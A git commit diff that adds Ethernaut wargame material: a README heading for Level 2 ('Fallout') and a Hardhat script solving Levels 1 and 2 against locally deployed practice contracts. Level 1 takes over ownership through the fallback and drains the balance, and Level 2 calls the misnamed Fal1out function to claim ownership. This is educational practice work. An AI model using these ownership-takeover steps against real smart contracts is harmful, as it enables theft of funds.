827ceed8e1fc532f6bc2777eb34fd5e74a96b8cf
Eskaine <eskaineliu@gmail.com>
2023-05-07 14:22:07 +0800

    chore: added ethernaut level 2 and solution

--- module-4/ethernaut/README.md
+++ module-4/ethernaut/README.md
@@ -6,4 +6,8 @@ You will beat this level if
     1. you claim ownership of the contract
     2. you reduce its balance to 0
 
-## Level 2 -
+## Level 2 - Fallout
+
+Claim ownership of the contract below to complete this level.
+
+
--- module-4/ethernaut/scripts/solutions.js
+++ module-4/ethernaut/scripts/solutions.js
@@ -1,18 +1,34 @@
 const hre = require("hardhat");
 
-async function main() {
-  // Ethernaut Level 1
+// Ethernaut Level 1
+async function runLevel1() {
+  const [, user] = await ethers.getSigners();
   const Fallback = await hre.ethers.getContractFactory("Fallback");
   const fallback = await Fallback.deploy();
   await fallback.deployed();
-
-  const [, user] = await ethers.getSigners();
 
   // Level 1 Solution
   const value = ethers.utils.parseUnits("1", "gwei");
   await fallback.connect(user).contribute({value});
   await user.sendTransaction({to: fallback.address, value});
   await fallback.connect(user).withdraw();
+}
+
+// Ethernaut Level 2
+async function runLevel2() {
+  const [, user] = await ethers.getSigners();
+  const Fallout = await hre.ethers.getContractFactory("Fallout");
+  const fallout = await Fallout.deploy();
+  await fallout.deployed();
+
+  // Level 2 Solution
+  const value = ethers.utils.parseUnits("1", "gwei");
+  await fallout.connect(user).Fal1out({value});
+}
+
+async function main() {
+  runLevel1();
+  runLevel2();
 }
 
 main().catch((error) => {
